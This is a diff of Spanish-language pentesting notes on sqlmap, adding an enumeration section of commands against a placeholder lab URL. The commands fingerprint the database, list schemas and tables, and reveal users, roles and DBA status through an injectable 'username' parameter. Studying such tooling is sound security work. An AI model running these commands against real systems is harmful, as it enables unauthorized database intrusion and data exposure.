@@ -1,4 +1,4 @@
-# SQL-Map 
+# SQLMap 
 
 Tags: #Tool #Web #Enumeracion #BurpSuite #SQLI #Git #SQLMap 
 
@@ -158,9 +158,36 @@ Al utilizar SQLMap, los profesionales de seguridad pueden identificar y corregir
 ## Enumeración 
 
 ```bash 
+❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&login-php-submit-button=Login" --dbs --dbms MySQL --random-agent -p username --fingerprint 
+	# fingerprint = Es la encargada de la deteccion de la version de la DB
 
+❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&login-php-submit-button=Login" --dbs --dbms MySQL --random-agent -p username --banner
+	# banner = Informacion de la DB, SO, Tecnologia, etc...
+
+❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&login-php-submit-button=Login" --dbs --dbms MySQL --random-agent -p username --current-db
+	# current-db = Retorna la DB actual de trabajo en la app
+
+❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&login-php-submit-button=Login" --dbs --dbms MySQL --random-agent -p username --count
+	# count = Obtiene la info de cada tabla en cada DB existente 
+
+❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&login-php-submit-button=Login" --dbs --dbms MySQL --random-agent -p username --schema
+	# schema = Nos muestra la DB 'Information Schema' la cual contiene la configuracion logica de las DB existentes
 ```
 
+```bash 
+❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&login-php-submit-button=Login" --dbs --dbms MySQL --random-agent -p username --users --is-dba --current-user --roles
+	
+	# users = Muestra los usuarios en la DB
+	# is-dba = Muestra 'True' si somos el usuario 'admin' de la DB 
+	# current-user = Muestra el nombre del usuario actual
+	# roles = Muestra el rol de cada usuario 
+```
+
+```bash 
+❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&login-php-submit-button=Login" --dbs --dbms MySQL --random-agent -p username 
+
+	# 
+```
 
 ## Ejemplo 1
 
